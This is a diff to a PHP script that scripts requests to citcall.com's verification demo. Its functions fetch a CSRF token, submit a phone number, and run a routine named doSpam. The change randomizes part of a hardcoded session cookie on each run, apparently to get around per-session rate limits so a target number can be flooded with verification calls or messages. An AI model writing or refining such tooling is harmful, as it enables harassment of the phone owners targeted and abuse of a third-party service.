@@ -1,4 +1,5 @@
 <?php
+$rand = rand(111, 9999);
 function get_betwen($string, $start, $end) {
 		$string = " ".$string;
 		$ini = strpos($string,$start);
@@ -18,7 +19,7 @@ function color($color = "default" , $text){
  }
 
 function getCsrf(){
-
+		global $rand;
 		$curl = curl_init();
 
 		curl_setopt_array($curl, array(
@@ -44,7 +45,7 @@ function getCsrf(){
 		    'sec-fetch-dest: document',
 		    'referer: https://www.citcall.com/',
 		    'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		    'cookie: PHPSESSID=c7e015248b6c1374885d5501bf579655; _ga=GA1.2.1719997530.1610788006; _gid=GA1.2.1836554639.1610788006; crisp-client%2Fsession%2F331cd7b6-4c4b-43a0-b084-5a239bed3ca4=session_1ea8f024-bbea-4624-9b1c-a3d1154da244'
+		    'cookie: PHPSESSID=c7e015248b6c1374885d5501bf579655; _ga=GA1.2.1719997530.1610788006; _gid=GA1.2.1836554639.1610788006; crisp-client%2Fsession%2F331cd7b6-4c4b-43a0-b084-5a239bed3ca4=session_1ea8f024-bbea-4624-9b1c-a3d1154da'.$rand
 		  ),
 		));
 
@@ -60,7 +61,7 @@ function getCsrf(){
 }
 
 function Verif($no, $csrf){
-
+		global $rand;
 		$curl = curl_init();
 
 		curl_setopt_array($curl, array(
@@ -89,7 +90,7 @@ function Verif($no, $csrf){
 		    'sec-fetch-dest: document',
 		    'referer: https://www.citcall.com/demo/',
 		    'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		    'cookie: PHPSESSID=c7e015248b6c1374885d5501bf579655; _ga=GA1.2.1719997530.1610788006; _gid=GA1.2.1836554639.1610788006; crisp-client%2Fsession%2F331cd7b6-4c4b-43a0-b084-5a239bed3ca4=session_1ea8f024-bbea-4624-9b1c-a3d1154da244'
+		    'cookie: PHPSESSID=c7e015248b6c1374885d5501bf579655; _ga=GA1.2.1719997530.1610788006; _gid=GA1.2.1836554639.1610788006; crisp-client%2Fsession%2F331cd7b6-4c4b-43a0-b084-5a239bed3ca4=session_1ea8f024-bbea-4624-9b1c-a3d1154da'.$rand
 		  ),
 		));
 
@@ -103,7 +104,7 @@ function Verif($no, $csrf){
 
 
 function  doSpam($no, $csrf){
-
+		global $rand;
 		$curl = curl_init();
 
 		curl_setopt_array($curl, array(
@@ -130,7 +131,7 @@ function  doSpam($no, $csrf){
 		    'sec-fetch-dest: empty',
 		    'referer: https://www.citcall.com/demo/verification.php',
 		    'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-		    'cookie: PHPSESSID=c7e015248b6c1374885d5501bf579655; _ga=GA1.2.1719997530.1610788006; _gid=GA1.2.1836554639.1610788006; crisp-client%2Fsession%2F331cd7b6-4c4b-43a0-b084-5a239bed3ca4=session_1ea8f024-bbea-4624-9b1c-a3d1154da244'
+		    'cookie: PHPSESSID=c7e015248b6c1374885d5501bf579655; _ga=GA1.2.1719997530.1610788006; _gid=GA1.2.1836554639.1610788006; crisp-client%2Fsession%2F331cd7b6-4c4b-43a0-b084-5a239bed3ca4=session_1ea8f024-bbea-4624-9b1c-a3d1154da'.$rand
 		  ),
 		));
 
